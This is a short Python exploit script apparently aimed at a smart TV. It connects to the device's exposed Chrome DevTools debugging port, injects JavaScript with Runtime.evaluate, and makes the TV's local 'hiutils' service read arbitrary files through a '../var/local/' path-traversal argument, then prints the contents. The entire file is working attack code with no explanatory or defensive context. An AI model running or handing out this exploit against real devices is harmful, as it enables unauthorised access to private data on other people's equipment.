#!/usr/bin/env python3
import json, sys, urllib.request, websocket
PATH = sys.argv[1]
PAGE = json.load(urllib.request.urlopen("http://<TV_IP>:9226/json/list"))[0]["id"]
EXPR = """
(async () => {
  const r = await fetch("http://localhost:9009/service/hiutils", {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({api:"fileRead",args:{path:["../var/local/%s"],mode:6}})});
  const j = JSON.parse(await r.text());
  return (j && j.ret) ? String(j.msg) : "READFAIL:" + JSON.stringify(j && j.msg).slice(0,100);
})()
""" % PATH
ws = websocket.create_connection("ws://<TV_IP>:9226/devtools/page/" + PAGE, timeout=60)
ws.send(json.dumps({"id":1,"method":"Runtime.evaluate","params":{"expression":EXPR,"returnByValue":True,"awaitPromise":True}}))
while True:
    m = json.loads(ws.recv())
    if m.get("id") == 1:
        r = m.get("result", {})
        if "exceptionDetails" in r: print("EXC:", json.dumps(r["exceptionDetails"])[:200])
        else: print(r.get("result", {}).get("value"))
        break
